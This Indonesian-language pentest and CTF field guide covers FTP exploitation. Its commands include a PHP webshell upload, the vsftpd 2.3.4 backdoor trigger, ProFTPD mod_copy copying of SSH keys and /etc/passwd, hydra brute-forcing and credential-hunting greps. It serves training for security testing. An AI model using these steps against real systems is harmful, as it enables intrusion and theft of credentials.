---
id: "07"
title: "07. FTP & FTPS Exploitation Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "07_ftp_workflow.md"
refs_out: ["05","06","08","14a","14b","15","44","48"]
refs_in: ["04","05","06","08","09","14a","14b","14c","14d","17a","17b","17c","18","19","24","25","26","35"]
---

# 07. FTP & FTPS Exploitation Workflow — Master Field Guide 

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Network & Infrastructure)
SERVICE TARGET     : File Transfer Protocol (FTP / FTPS / ProFTPD / vsftpd)
DEFAULT PORTS      : TCP 21 (Control Channel), TCP 20 (Active Data Channel)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)
==================================================================================
```

---

## 🧠 BAGIAN 1: FTP FUNDAMENTALS

### 1.1 Apa itu FTP dan Cara Kerjanya? (Analogi Kasir & Gudang Pengambilan Barang)

**File Transfer Protocol (FTP)** adalah salah satu protokol jaringan tertua (didefinisikan dalam RFC 959 pada tahun 1985) yang dirancang khusus untuk memindahkan file antara client dan server melalui jaringan TCP/IP.

```text
+=============================================================================+
|                 ANALOGI KASIR & GUDANG PENGAMBILAN BARANG                   |
+=============================================================================+
|                                                                             |
|  [ JALUR KASIR: CONTROL CHANNEL (PORT 21) ]                                 |
|  Client ───────────────── Perintah Teks (LIST, RETR, STOR) ────────────────> Server
|  Client <──────────────── Kode Status (200 OK, 230 Logged In, 530 Denied) ── Server
|  (Hanya instruksi dan otentikasi teks, tidak ada pemindahan file di sini!)   |
|                                                                             |
|  [ PINTU GUDANG: DATA CHANNEL (PORT 20 ATAU HIGH PORT DINAMIS) ]            |
|  Client <══════════════════ Aliran File Fisik / Listing Teks ══════════════> Server
|  (Pintu data dibuka HANYA saat transfer berlangsung, lalu ditutup seketika)  |
+=============================================================================+
```

FTP menggunakan **dua kanal terpisah (*Dual-Channel Architecture*)**:
1. **Control Connection (Command Channel / Port 21)**: Tetap terbuka selama sesi berlangsung untuk mengirim perintah teks dan menerima kode status respon (`USER`, `PASS`, `PORT`, `PASV`, `QUIT`).
2. **Data Connection (Transfer Channel)**: Dibuka secara dinamis hanya saat ada pengiriman data nyata (seperti menampilkan `ls`/`dir` atau transfer file via `get`/`put`), dan langsung ditutup begitu transfer data selesai.

---

### 1.2 Perbedaan Krusial: FTP vs. FTPS vs. SFTP

Banyak pemula salah mengira bahwa FTPS dan SFTP adalah protokol yang sama. Memahami perbedaannya sangat penting untuk menentukan tool dan metode koneksi:

| Protokol                     | Port Default                              | Lapisan Transport | Mekanisme Enkripsi & Karakteristik                                                                                                        |
| :--------------------------- | :---------------------------------------- | :---------------- | :---------------------------------------------------------------------------------------------------------------------------------------- |
| **FTP (Plaintext)**          | 21 (Control), 20 (Data)                   | TCP               | **TIDAK ADA ENKRIPSI**. Kredensial & data dikirim dalam bentuk cleartext mentah (mudah disadap via Wireshark).                            |
| **FTPS (FTP-over-SSL/TLS)**  | 21 (Explicit / AUTH TLS) / 990 (Implicit) | TCP + TLS/SSL     | Protokol FTP standar yang dibungkus enkripsi TLS/SSL. Membutuhkan handshake sertifikat SSL.                                               |
| **SFTP (SSH File Transfer)** | 22 (SSH Subsystem)                        | SSHv2             | **BUKAN FTP!** Ini adalah subsistem file transfer yang berjalan penuh di dalam protokol SSH ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)). |

---

### 1.3 Active Mode (PORT) vs. Passive Mode (PASV)

Perbedaan mode ini adalah penyebab utama mengapa perintah `ls` atau `get` sering mengalami *hang* atau *timeout* di lab CTF:

```text
ACTIVE MODE (Client Mendikte Port Data - Rawan Diblokir Firewall):
[ Client ] ----------------- SYN (Port 21: Control) ----------------> [ FTP Server ]
[ Client ] <----------------- 220 Service Ready --------------------- [ FTP Server ]
[ Client ] -- PORT 10,10,14,5,195,80 (Kirim IP & Port Client 50000) -> [ FTP Server ]
[ Client ] <--- SYN (Server:20 connect KE Client:50000) ------------- [ FTP Server ]
                ▲
                └── DITOLAK FIREWALL / NAT CLIENT (Inbound Connection Blocked!)

PASSIVE MODE (Server Membuka Port Dinamis - Lolos Firewall):
[ Client ] ----------------- SYN (Port 21: Control) ----------------> [ FTP Server ]
[ Client ] --------------------- PASV Command ----------------------> [ FTP Server ]
[ Client ] <-- 227 Entering Passive Mode (10,10,11,200,195,80) ------ [ FTP Server ]
[ Client ] --- SYN (Client connect KE Server Port 50000 Dinamis) ---> [ FTP Server ]
                ▲
                └── LOLOS FIREWALL / NAT (Outbound Connection Diizinkan!)
```

* **Active Mode**: Client menyuruh server menghubunginya balik pada port lokal acak. Jika mesin penyerang berada di belakang VPN NAT (`tun0`), firewall lokal akan menolak koneksi masuk dari server ➔ *Error 425 Failed to establish connection*.
* **Passive Mode (PASV)**: Server yang membuka port tinggi acak (>1024), lalu client yang berinisiatif menghubunginya keluar. **Selalu gunakan Passive Mode di CTF dan pentest!**

---

### 1.4 Anonymous Login

**Anonymous Access** adalah fitur FTP di mana pengguna diizinkan login tanpa akun terdaftar:
* **Username Standar**: `anonymous` atau `ftp`
* **Password Standar**: Bebas (biasanya diisi email sembarang `anonymous@` atau dikosongkan).
* **Risiko Keamanan**: Membocorkan file sensitif (*information disclosure*), file backup, SSH private key, atau pengunggahan file berbahaya (*arbitrary file upload / webshell*) jika ada hak tulis (*write permission*).

---

### 1.5 Membaca FTP Banner

Banner adalah pesan teks yang pertama kali dikirimkan server saat client terhubung ke port 21 (Kode Respon `220`):

```text
220 (vsFTPd 2.3.4)                         --> Target: Linux, Daemon: vsftpd v2.3.4 (Rentan Backdoor!)
220 ProFTPD 1.3.5 Server (Debian)          --> Target: Linux Debian, Daemon: ProFTPD v1.3.5 (mod_copy)
220-FileZilla Server 0.9.41 beta           --> Target: Windows, Daemon: FileZilla Server legacy
220 Microsoft FTP Service                  --> Target: Windows IIS FTP Service
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL FTP

```text
========================================================================================================
TOOL             FUNGSI UTAMA                     KECEPATAN   INTERAKTIF   ANONYMOUS TEST   AUTH BRUTE
=======================================================================================================
ftp              Standard FTP Client Linux        Tinggi      Ya           Ya               Manual
nc (netcat)      Raw Banner Grabbing & Debugging  Sangat Cepat Ya (Raw)    Manual           Manual
curl             Direct CLI Download & Directory  Sangat Cepat Tidak       Ya               Ya
wget             Recursive Directory Mirroring    Tinggi      Tidak        Ya               Ya
lftp             Advanced Multithreaded Mirroring Sangat Cepat Ya / Script Ya               Ya
hydra            High-Speed Online Bruteforce     Sangat Cepat Tidak       Tidak            Ya (Otomatis)
nmap (NSE)       Automated Vulnerability & Config Sedang      Tidak        Ya               Terbatas
searchsploit     Local Exploit Database Lookup    Instant     Tidak        -                -
msfconsole       Exploitation Framework Modules   Sedang      Ya / Script  Ya               Ya
========================================================================================================
```

---

### 2.1 `ftp` — Client Standar Linux
* **Fungsi**: Menghubungkan terminal secara interaktif langsung ke FTP server.
* **Flag Penting**:
  * `-p` : Mengaktifkan Passive Mode secara otomatis.
  * `-n` : Mencegah auto-login awal.
  * `-v` : Verbose (menampilkan seluruh kode respon server).

```bash
# Menghubungkan ke target dalam mode passive
ftp -p 10.10.11.200
```

---

### 2.2 `nc` (Netcat) — Banner Grab & Raw Probe
* **Fungsi**: Mengirim paket TCP mentah ke port 21 tanpa overhead protokol FTP client.
* **Kapan Digunakan**: Membaca banner asli dan mengirim perintah manual mentah.

```bash
nc -vn 10.10.11.200 21
```

* **Contoh Output Nyata**:
```text
(UNKNOWN) [10.10.11.200] 21 (ftp) open
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.11.200]
```

---

### 2.3 `curl` — CLI Listing & Single File Download
* **Fungsi**: Melakukan query FTP satu baris non-interaktif langsung dari terminal.

```bash
# 1. Anonymous directory listing via curl
curl -s ftp://10.10.11.200/

# 2. Download file dengan autentikasi
curl -u "admin:Password123" -O ftp://10.10.11.200/confidential/db_backup.sql
```

---

### 2.4 `wget` — Recursive File Downloader
* **Fungsi**: Mengunduh seluruh struktur folder dan file di FTP server secara otomatis.
* **Flag Penting**:
  * `--mirror` (`-m`) : Mengaktifkan recursive mirroring.
  * `--no-passive-ftp` : Mematikan passive mode jika server hanya mengizinkan active mode.
  * `--no-parent` : Mencegah download naik ke direktori induk.
  * `-P <folder>` : Menentukan folder penyimpanan lokal.

```bash
# Download seluruh isi anonymous FTP server secara rekursif ke folder ./ftp_loot/
wget -m --no-passive-ftp --no-parent -P ./ftp_loot/ ftp://anonymous:anonymous@10.10.11.200/
```

---

### 2.5 `lftp` — Advanced Multithreaded Mirroring
* **Fungsi**: FTP client canggih yang mendukung proses download paralel (*multithreading*) dan mirroring direktori penuh.

```bash
# Mirroring seluruh FTP server ke folder lokal './ftp_loot/' dengan 5 koneksi paralel
lftp -u 'anonymous,anonymous' 10.10.11.200 -e "mirror --parallel=5 --verbose / ./ftp_loot/; quit"
```

---

### 2.6 `hydra` — High-Speed FTP Bruteforce
* **Fungsi**: Melakukan online dictionary attack terhadap login FTP.
* **Flag Penting**:
  * `-l <user>` / `-L <userlist>` : Target username.
  * `-p <pass>` / `-P <passlist>` : Target wordlist password.
  * `-t 4` : Batasi thread ke 4 (FTP server rentan menolak koneksi jika thread terlalu tinggi).
  * `-f` : Berhenti segera saat menemukan password valid.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.200 ftp -t 4 -f -V
```

---

### 2.7 `nmap` NSE Scripts untuk FTP

```bash
# 1. Pengecekan status Anonymous Login
nmap -p 21 --script ftp-anon 10.10.11.200

# 2. Ekstraksi info sistem & fitur FTP (SYST / FEAT command)
nmap -p 21 --script ftp-syst 10.10.11.200

# 3. Pengecekan kerentanan Backdoor vsftpd 2.3.4
nmap -p 21 --script ftp-vsftpd-backdoor 10.10.11.200

# 4. Menjalankan seluruh script deteksi FTP secara terpadu
nmap -p 21 --script "ftp-* and not brute" 10.10.11.200
```

---

### 2.8 `searchsploit` & Metasploit Modules

```bash
# Pencarian exploit di database lokal Parrot OS
searchsploit vsftpd 2.3.4
searchsploit proftpd 1.3.5

# Modul Metasploit yang wajib dihafal:
# - exploit/unix/ftp/vsftpd_234_backdoor
# - exploit/unix/ftp/proftpd_modcopy_exec
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Target di Terminal Parrot OS:
export TARGET="10.10.11.200"
echo "Target FTP Server set to: $TARGET"
```

---

### FASE 1: BANNER GRABBING & VERSION DETECTION

**Tujuan**: Mengambil string banner mentah dari port 21 untuk menentukan versi exact software FTP dan memetakannya ke CVE database.

```bash
# 1. Raw banner grabbing via Netcat
nc -vn $TARGET 21

# 2. Detail Nmap Service & SYST Script Scan
nmap -sV -p 21 --script banner,ftp-syst $TARGET -oN nmap_ftp_version.txt
```

* **Contoh Output Nyata Nmap**:
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_banner: 220 (vsFTPd 2.3.4)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

#### Mapping Versi FTP Populer ➔ Known Vulnerabilities:

| Versi FTP Daemon | Identifikasi Banner | Kerentanan / CVE | Dampak / Exploit Vector |
| :--- | :--- | :--- | :--- |
| **vsftpd 2.3.4** | `220 (vsFTPd 2.3.4)` | **CVE-2011-2523** | **Remote Root Shell** (Port 6200 backdoor listener). |
| **ProFTPD 1.3.5** | `220 ProFTPD 1.3.5 Server` | **CVE-2015-3306** | **Unauthenticated File Copy** (`mod_copy` arbitrary read/write). |
| **ProFTPD < 1.3.3c** | `220 ProFTPD 1.3.3c Server` | **CVE-2010-4221** | Stack Overflow / Telnet IAC RCE. |
| **FileZilla Server < 0.9.41**| `220-FileZilla Server 0.9.x`| **CVE-2012-0002** | Directory Traversal / Information Disclosure. |
| **Solaris FTP** | `220 ... SunOS ...` | **CVE-2020-14871** | Remote Code Execution (*Solaris buffer overflow*). |

---

### FASE 2: ANONYMOUS LOGIN CHECK

**Tujuan**: Mengetahui apakah FTP server mengizinkan login tanpa otentikasi.

```bash
# 1. Automated check via Nmap script
nmap -p 21 --script ftp-anon $TARGET

# 2. Manual CLI check via standard ftp client
ftp -p $TARGET
# Masukkan Username: anonymous
# Masukkan Password: anonymous@
```

* **Contoh Output Nyata**:
```text
Connected to 10.10.11.200.
220 (vsFTPd 3.0.3)
Name (10.10.11.200:user): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

---

### FASE 3: FILE ENUMERATION & LOOTING

**Tujuan**: Menjelajahi seluruh struktur folder dan mendownload semua data sensitif ke mesin lokal.

#### 1. Navigasi & Download Interaktif di Dalam Prompt `ftp>`:
```text
ftp> passive                # Pastikan passive mode aktif
Passive mode on.
ftp> pwd                    # Cek current remote directory
257 "/" is current directory.
ftp> ls -la                 # List SEMUA file (termasuk hidden dotfiles seperti .ssh atau .env)
drwxr-xr-x    2 1000     1000         4096 Jan 20 12:40 .
drwxr-xr-x    2 1000     1000         4096 Jan 20 12:40 ..
-rw-r--r--    1 1000     1000          220 Jan 20 12:35 .bash_history
-rw-r--r--    1 1000     1000         2602 Jan 20 12:38 id_rsa
-rw-r--r--    1 0        0             145 Jan 20 12:45 notes.txt
ftp> binary                 # WAJIB: Ganti ke binary mode agar file tidak corrupt!
200 Switching to Binary mode.
ftp> get notes.txt          # Download single file
ftp> prompt                 # Matikan prompt konfirmasi mget
Interactive mode off.
ftp> mget *                 # Download semua file di direktori saat ini
ftp> quit
```

#### 2. Non-Interactive Batch Looting (Rekomendasi Cepat):
```bash
# Buat direktori loot lokal
mkdir -p ./ftp_loot/

# Opsi 1: Menggunakan wget untuk mirror recursive seluruh isi FTP
wget -m --no-passive-ftp --no-parent -P ./ftp_loot/ ftp://anonymous:anonymous@$TARGET/

# Opsi 2: Menggunakan lftp untuk mirror multithreaded (Paling Cepat & Robust)
lftp -c "set ftp:passive-mode yes; open ftp://$TARGET; user anonymous anonymous; mirror --parallel=5 / ./ftp_loot/; quit"
```

#### File Target Utama yang Wajib Diperiksa (*High-Value Loot*):
* `id_rsa`, `id_dsa`, `id_ed25519`, `authorized_keys` (SSH Keys).
* `.bash_history`, `.zsh_history`, `.mysql_history` (Command history & leaked passwords).
* `wp-config.php`, `.env`, `web.config`, `settings.py`, `database.yml` (Web configs).
* `backup.zip`, `site_dump.tar.gz`, `database.sql`, `*.bak` (Backup archives).
* `notes.txt`, `users.txt`, `passwords.xlsx`, `creds.json` (Plaintext passwords).

---

### FASE 4: WRITABLE DIRECTORY CHECK & WEBSHELL UPLOAD

**Tujuan**: Menguji apakah kita memiliki hak akses menulis (*Write Permission / STOR command*) dan mengecek apakah direktori FTP tersebut terhubung langsung ke Web Server Root.

#### 1. Cara Mengidentifikasi Webroot Path Berdasarkan OS / Web Server:
* **Linux Apache**: `/var/www/html/`
* **Linux Nginx**: `/usr/share/nginx/html/` atau `/var/www/html/`
* **Windows IIS**: `C:\inetpub\wwwroot\`
* **Windows XAMPP**: `C:\xampp\htdocs\`

#### 2. Cara Cek Webroot dari Prompt FTP:
```text
ftp> pwd
257 "/var/www/html" is current directory.
# JIKA FTP ROOT IS WEBROOT -> Langsung upload webshell!

# Jika FTP berada di /home/ftpuser, coba uji directory traversal:
ftp> cd ../../../var/www/html
# Jika berhasil berpindah, ini adalah path webroot target!
```

#### 3. Flow Eksploitasi Upload Web Shell:
```bash
# Langkah 1: Buat simple PHP webshell di lokal
echo '<?php if(isset($_GET["cmd"])){ echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>' > shell.php

# Langkah 2: Upload webshell ke FTP server
curl -u "anonymous:anonymous" -T shell.php ftp://$TARGET/

# Langkah 3: Trigger command execution via HTTP GET Request
curl -s "http://$TARGET/shell.php?cmd=id"
# Output: <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

---

### FASE 5: EXPLOIT KNOWN VULNERABILITIES

---

#### 🔴 PATH A: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

* **Mekanisme**: Pada tahun 2011, source code `vsftpd-2.3.4.tar.gz` di server master sempat disusupi penyerang (*Supply Chain Attack*). Jika client mengirimkan username yang berakhiran karakter senyum `:)` (misal: `hacked:)`), server vsftpd akan membuka listener shell backdoor di **Port TCP 6200** dengan hak akses **ROOT**.

```bash
# METODE 1: MANUAL EXPLOITATION (Netcat Murni)
# Langkah 1: Kirim trigger backdoor ke port 21
nc -vn $TARGET 21
```
```text
220 (vsFTPd 2.3.4)
USER pentester:)
331 Please specify the password.
PASS anypassword
```
*(Jangan tutup sesi di atas, biarkan trigger memproses).*

```bash
# Langkah 2: Hubungkan netcat ke port backdoor 6200 di terminal baru
nc -vn $TARGET 6200
```
```text
(UNKNOWN) [10.10.11.200] 6200 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

```bash
# METODE 2: MENGGUNAKAN METASPLOIT
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; \
set RHOSTS $TARGET; \
set RPORT 21; \
exploit"
```

---

#### 🔴 PATH B: ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306)

* **Mekanisme**: Modul `mod_copy` pada ProFTPD 1.3.5 mengizinkan perintah custom `SITE CPFR` (*Copy From*) dan `SITE CPTO` (*Copy To*) dieksekusi oleh user yang **belum terotentikasi (Unauthenticated)**. Penyerang dapat menyalin file apa pun di sistem ke lokasi webroot publik atau menyalin file sensitif ke lokasi yang dapat dibaca.

```bash
# Eksploitasi Manual via Netcat:
nc -vn $TARGET 21
```
```text
220 ProFTPD 1.3.5 Server (Debian) [10.10.11.200]

# Contoh Kasus 1: Salin SSH Key user 'kenobi' ke direktori webroot
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/id_rsa
250 Copy successful

# Contoh Kasus 2: Salin file konfigurasi sensitif /etc/passwd
SITE CPFR /etc/passwd
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/passwd.txt
250 Copy successful
QUIT
221 Goodbye.
```

```bash
# Unduh file hasil salinan dari web server, lalu login SSH:
wget http://$TARGET/id_rsa -O id_rsa_kenobi
chmod 600 id_rsa_kenobi
ssh -i id_rsa_kenobi kenobi@$TARGET
```

---

#### 🔴 PATH C: FTP Bounce Attack (RFC 959 Abuse)

* **Konsep**: Protokol FTP mengizinkan client menggunakan perintah `PORT <ip,port>` untuk memerintahkan FTP server mengirim data ke host pihak ketiga, bukan ke client itu sendiri (*Proxy Port Scanning*).

> [!NOTE]
> **Realita Pentest Modern**: FTP Bounce scan via Nmap (`nmap -b`) praktis sudah usang pada server modern karena hampir seluruh daemon memblokir perintah `PORT` yang ditujukan ke IP lain. Lebih disarankan menggunakan **SSH Dynamic Port Forwarding / SOCKS5 Tunneling** ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)) untuk melakukan pivoting ke jaringan internal target.

```bash
# Perintah scan FTP bounce nmap legacy:
nmap -Pn -v -b anonymous:anonymous@$TARGET 192.168.1.1 -p 22,80,445,3389
```

---

### FASE 6: BRUTE FORCE FTP

> [!WARNING]
> Bruteforce FTP hanya realistis jika Anonymous login ditolak dan Anda sudah memiliki daftar username valid (dari enumerasi SMB/RPC/Web). Jangan set thread terlalu tinggi (maksimal `-t 4`) agar server tidak memicu *Connection Limit Error (421)*.

```bash
# 1. Single User Bruteforce menggunakan Hydra
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt $TARGET ftp -t 4 -f -V

# 2. Multi-User Spraying via NetExec
nxc ftp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

---

## 🌳 BAGIAN 4: DECISION TREE LENGKAP

```text
                             [PORT 21 (FTP) TERBUKA]
                                        │
                         ┌──────────────┴──────────────┐
                         │  Banner Grab via Netcat /   │
                         │  Nmap Service Version Check │
                         └──────────────┬──────────────┘
                                        │
                   ┌────────────────────┴────────────────────┐
                   │                                         │
         [KNOWN VULNERABLE CVE?]                   [GENERIC / MODERN DAEMON]
                   │                                         │
        ┌──────────┴──────────┐                              │
        │                     │                              │
   [vsftpd 2.3.4]      [ProFTPD 1.3.5]                       │
        │                     │                              │
   Trigger Backdoor      mod_copy SITE CPFR/CPTO             │
   (USER :) / Port 6200) (Copy id_rsa / Shell to Web)        │
        │                     │                              │
   ROOT SHELL!           INITIAL ACCESS / RCE                │
                                                             │
                             ┌───────────────────────────────┘
                             │
                    [TEST ANONYMOUS ACCESS]
                    ftp -p $TARGET (anonymous)
                             │
                ┌────────────┴────────────┐
                │                         │
        [ANONYMOUS GRANTED]       [LOGIN FAILED / 530]
                │                         │
        ┌───────┴───────┐         Collect Usernames from Web/SMB/RPC
        │               │                 │
   [LIST FILES]   [CHECK WRITE]   Hydra / NetExec Bruteforce
        │               │         hydra -l user -P rockyou.txt
   Loot Data:     Writable Webroot?       │
   - id_rsa       ┌─────┴─────┐   [VALID CREDS FOUND]
   - *.bak / .env │           │           │
   - passwords.txt│           │     Access Authenticated FTP
        │        [YES]       [NO]         │
        │         │           │     Loot Restricted Directories
        │     Upload PHP    Upload        │
        │     Webshell      Malicious     │
        │         │         Script        │
        │     RCE / SHELL   (Cronjob)     │
        │                                 │
        └───────────────┬─────────────────┘
                        │
            [CREDENTIAL & KEY REUSE]
                        │
         ┌──────────────┴──────────────┐
         │                             │
   [SSH KEY / PASS]             [DOMAIN / SMB PASS]
         │                             │
   ssh -i id_rsa user@target     nxc smb $TARGET -u user -p pass
```

---

## 🛡️ BAGIAN 5: PASSIVE MODE & FIREWALL BYPASS

### 1. Mengapa FTP Sering Hang Saat Melakukan `ls` / `dir`?

Saat client berada di mode **Active**, client mengirimkan instruksi ke server: *"Tolong hubungkan port 20 kamu ke IP 10.10.14.5 port 45000 milik saya."*  
Namun, interface VPN (`tun0`) atau firewall client menolak koneksi masuk (*Inbound Connection*) yang diinisiasi oleh server tersebut. Akibatnya: Terminal menampilkan `200 PORT command successful`, tetapi diam tak bergerak (*Hang*) dan akhirnya muncul error: `425 Failed to establish connection`.

### 2. Cara Mengaktifkan Passive Mode di Berbagai Tool:

```bash
# 1. Standard Linux FTP Client (Gunakan perintah 'passive' di dalam prompt)
ftp $TARGET
ftp> passive
Passive mode on.
ftp> ls

# 2. Curl Command (Flag --ftp-pasv)
curl -s --ftp-pasv ftp://anonymous:anonymous@$TARGET/

# 3. Wget Downloader
wget --passive-ftp ftp://anonymous:anonymous@$TARGET/

# 4. LFTP Client
lftp -u anonymous,anonymous $TARGET -e "set ftp:passive-mode yes; ls; quit"
```

---

## 🔗 BAGIAN 6: FTP + ATTACK CHAINING

```text
+----------------------------------------------------------------------------------------------------+
|                                 SKENARIO ATTACK CHAIN FTP DI CTF                                   |
+----------------------------------------------------------------------------------------------------+
| 1. FTP + Web Server   : Write share = Webroot -> Upload PHP webshell -> RCE (www-data / IIS)       |
| 2. FTP + Database     : Loot wp-config.php / .env -> Ambil Password DB -> Dump DB / SQL Injection |
| 3. FTP + SSH          : Loot /home/user/.ssh/id_rsa -> Login SSH User / Root (Port 22)             |
| 4. FTP + SMB / WinRM  : Loot passwords.txt -> Password Reuse / Spraying ke Port 445 / 5985         |
+----------------------------------------------------------------------------------------------------+
```

### Cara Memverifikasi Sinkronisasi FTP dengan Webroot:

1. Login ke FTP dan unggah file penanda unik:
   ```text
   ftp> put proof_check.txt
   ```
2. Lakukan query HTTP GET via curl ke port web target (80 / 443 / 8080):
   ```bash
   curl -I http://$TARGET/proof_check.txt
   ```
3. Jika server merespon dengan `HTTP/1.1 200 OK`, **Direktori FTP adalah Webroot!** Anda bisa langsung mengunggah file webshell `.php`, `.aspx`, atau `.jsp` untuk mendapatkan Remote Code Execution.

---

## 🔍 BONUS 1: GREP SETELAH LOOTING FTP

Setelah mendownload seluruh file dari server FTP ke folder `./ftp_loot/`, jalankan perintah berikut untuk mengekstrak kredensial:

```bash
# 1. Cari kata kunci password dan secret di seluruh file teks
find ./ftp_loot -type f 2>/dev/null | xargs grep -liE "password|secret|credential" 2>/dev/null

# 2. Cari kredensial database pada file PHP / Config
find ./ftp_loot -name "*.php" 2>/dev/null | xargs grep -liE "DB_PASS|mysql_connect|password" 2>/dev/null
find ./ftp_loot -name "*.env" 2>/dev/null -exec cat {} \;

# 3. Cari SSH Private Keys
find ./ftp_loot \( -name "id_rsa*" -o -name "*.key" -o -name "*.pem" \) 2>/dev/null

# 4. Cari skrip otomasi yang menyimpan hardcoded password
find ./ftp_loot -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" \) 2>/dev/null | xargs grep -liE "pass|secret|token" 2>/dev/null
```

---

## 🔒 BONUS 2: KONEKSI FTPS (JIKA PORT 21 MENGGUNAKAN SSL/TLS)

Jika server FTP mewajibkan enkripsi TLS/SSL (FTPS):

```bash
# 1. Koneksi FTPS via LFTP dengan SSL Bypass
lftp -e "set ssl:verify-certificate no; set ftp:ssl-force true; open $TARGET; user anonymous anonymous; ls; quit"

# 2. Koneksi FTPS via Curl
curl -k --ftp-ssl ftp://anonymous:anonymous@$TARGET/

# 3. Nmap Script untuk FTPS
nmap -p 21 --script ftp-anon --script-args "ftp.passive=true,ftp.ssl=true" $TARGET
```

---

## 🔧 BAGIAN 7: COMMON ERRORS & TROUBLESHOOTING

### 1. `530 Login incorrect` / `530 Permission denied`
* **Penyebab**: Server menonaktifkan Anonymous Login, atau username/password salah.
* **Solusi CLI**: Beralih ke enumerasi username via SMB/Web, lalu jalankan Hydra dengan `-t 4`.

### 2. `425 Failed to establish connection` / `425 Can't open data connection`
* **Penyebab**: Server mencoba menghubungkan port data ke client dalam Active Mode, tetapi terblokir firewall client.
* **Solusi CLI**: Ketik `passive` di dalam prompt FTP sebelum menjalankan `ls` atau `get`.

### 3. `229 Entering Extended Passive Mode (|||49153|)` Mengalami Hang
* **Penyebab**: Client mencoba menggunakan EPSV (IPv6), tetapi server berada di jaringan IPv4 NAT.
* **Solusi CLI**: Matikan EPSV di dalam prompt FTP:
```text
ftp> epsv4 off
ftp> passive
```

### 4. `550 Permission denied` (Saat `get` atau `put`)
* **Penyebab**: Akun tidak memiliki izin baca pada file, atau direktori berstatus *Read-Only*.
* **Solusi CLI**: Pindah ke direktori lain yang biasanya writable seperti `/uploads`, `/incoming`, `/tmp`, atau `/pub`.

### 5. `421 Service not available, remote server has closed connection`
* **Penyebab**: Server membatasi jumlah koneksi simultan (*max connections per IP*) atau sesi *timeout*.
* **Solusi CLI**: Jika terjadi saat brute force Hydra, turunkan thread menjadi `-t 1` atau `-t 2`.

### 6. `Connection refused` pada Port 21
* **Penyebab**: Service FTP mati atau berjalan di port non-standar (misal: 2121).
* **Solusi CLI**: Jalankan full port scan: `nmap -p- -T4 --min-rate 1000 $TARGET`.

### 7. Backdoor `vsftpd 2.3.4` Tidak Membuka Port 6200
* **Penyebab**: Paket vsftpd 2.3.4 telah di-patch, atau firewall host memblokir traffic inbound ke port 6200.
* **Solusi CLI**: Cek port 6200 via Nmap sesaat setelah trigger: `nmap -p 6200 -Pn $TARGET`.

### 8. File Binary Corrupt Setelah Didownload (`.zip` / `.pdf` Rusak)
* **Penyebab**: File diunduh dalam format default `ASCII`.
* **Solusi CLI**: Selalu ketik `binary` sebelum mendownload file biner:
```text
ftp> binary
ftp> get backup.zip
```

### 9. `curl: (67) Access denied: 530`
* **Penyebab**: Format URL curl salah atau anonymous login ditolak.
* **Solusi CLI**: Tulis kredensial secara eksplisit:
```bash
curl -u "anonymous:anonymous" ftp://$TARGET/
```

### 10. `GnuTLS error - The TLS connection was non-properly terminated`
* **Penyebab**: Target menggunakan FTPS (Explicit TLS) dan client standar tidak mendukung handshake SSL.
* **Solusi CLI**: Gunakan `lftp` dengan konfigurasi SSL bypass:
```bash
lftp -e "set ssl:verify-certificate no" -u "user,pass" $TARGET
```

---

## 🏆 BAGIAN 8: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: Anonymous FTP ➔ SSH Key Looting ➔ Root Shell

**Target**: Linux Machine (HTB Academy / Proving Grounds)

#### Step 1: Enumerasi Port & Anonymous Access
```bash
nmap -sV -p 21 --script ftp-anon $TARGET
```
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsFTPd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 10 08:30 pub
```

#### Step 2: Mengakses Folder & Menemukan SSH Key
```bash
ftp -p $TARGET
```
```text
Name (10.10.11.200:user): anonymous
Password: 
230 Login successful.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
-rw-r--r--    1 0        0            2602 Feb 10 08:30 id_rsa
-rw-r--r--    1 0        0             120 Feb 10 08:32 note.txt
ftp> binary
200 Switching to Binary mode.
ftp> get id_rsa
226 Transfer complete.
ftp> get note.txt
226 Transfer complete.
ftp> quit
```

#### Step 3: Inspeksi Loot & Login via SSH ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh))
```bash
cat note.txt
# Output: "System maintenance key for user: tom"

chmod 600 id_rsa
ssh -i id_rsa tom@$TARGET
```
```text
tom@targetbox:~$ whoami
tom
tom@targetbox:~$ sudo -l
    (ALL : ALL) NOPASSWD: ALL
tom@targetbox:~$ sudo su
root@targetbox:/home/tom# whoami
root
```

---

